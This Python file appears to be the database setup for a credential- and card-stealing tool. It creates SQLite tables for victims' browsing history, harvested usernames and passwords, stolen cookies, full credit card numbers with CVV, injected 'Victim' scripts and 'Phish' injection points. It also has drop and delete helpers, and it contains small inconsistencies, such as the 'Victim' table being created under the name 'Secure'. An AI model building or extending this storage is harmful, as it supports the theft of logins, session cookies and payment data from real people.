import sqlite3

def create_all_tables():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    
    #### Crease Users Table ####
    q = """CREATE TABLE IF NOT EXISTS Users (
    EmailIP VARCHAR(255),
    LastOnline DATETIME,
    PRIMARY KEY (EmailIP)
    );"""
    c.execute(q)

    #### Crease History Table ####
    q = """CREATE TABLE IF NOT EXISTS History (
    EmailIP VARCHAR(255),
    Url TEXT UNIQUE,
    LastVisited DATETIME,
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

    #### Crease Login Table ####
    q = """CREATE TABLE IF NOT EXISTS Login (
    EmailIP VARCHAR(255),
    Url TEXT UNIQUE,
    Username VARCHAR(255),
    Password TEXT,
    TimeCollected DATETIME,
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

    #### Creat Cookies Table ####
    q = """CREATE TABLE IF NOT EXISTS Cookies (
    EmailIP VARCHAR(255),
    Url TEXT,
    CookieKey TEXT,
    CookieVal TEXT,
    TimeCollected DATETIME,
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP),
    PRIMARY KEY (EmailIP, Url, CookieKey)
    );"""
    c.execute(q)

    #### Create Secure Table ####
    q = """CREATE TABLE IF NOT EXISTS Secure (
    EmailIP VARCHAR(255),
    Url TEXT,
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

    #### Create Random Table ####
    q = """CREATE TABLE IF NOT EXISTS Random (
    EmailIP VARCHAR(255),
    Url TEXT,
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

    #### Create Victim Table ####
    q = """CREATE TABLE IF NOT EXISTS Secure (
    EmailIP VARCHAR(255),
    Script TEXT,
    Url TEXT,
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

        #### Create Phish Table ####
    q = """CREATE TABLE IF NOT EXISTS Phish (
    EmailIP VARCHAR(255),
    Url TEXT,
    InjectLocation VARCHAR(255),
    InjectClass VARCHAR(255),
    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

    #### Create CreditCard Table ###
    q = """CREATE TABLE IF NOT EXISTS Card (
        EmailIP CHAR(3),
        NameOnCard VARCHAR(30),
        CardNumber CHAR(16),
        ExpirationMonth CHAR(2),
        ExpirationYear CHAR(4),
        CVV CHAR(3),
        FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
    );"""
    c.execute(q)

    conn.commit()
    conn.close()

    print("All tables have been created")

def drop_all_tables():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()

    q = "DROP TABLE IF EXISTS Random"
    c.execute(q)

    q = "DROP TABLE IF EXISTS Secure"
    c.execute(q)

    q = "DROP TABLE IF EXISTS Login"
    c.execute(q)

    q = "DROP TABLE IF EXISTS History"
    c.execute(q)

    q = "DROP TABLE IF EXISTS Cookies"
    c.execute(q)

    q = "DROP TABLE IF EXISTS Card"
    c.execute(q)

    q = "DROP TABLE IF EXISTS Victim"
    c.execute(q)
    
    q = "DROP TABLE IF EXISTS Users"
    c.execute(q)

    conn.commit()
    conn.close()

    print("All tables have been dropped")

def delete_db():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()

    q = "DELETE FROM Random"
    c.execute(q)

    q = "DELETE FROM Secure"
    c.execute(q)

    q = "DELETE FROM Login"
    c.execute(q)

    q = "DELETE FROM History"
    c.execute(q)

    q = "DELETE FROM Cookies"
    c.execute(q)

    q = "DELETE FROM Card"
    c.execute(q)

    q = "DELETE FROM Victim"
    c.execute(q)

    q = "DElETE FROM Users"
    c.execute(q)

    conn.commit()
    conn.close()

    print("All table data have been deleted")
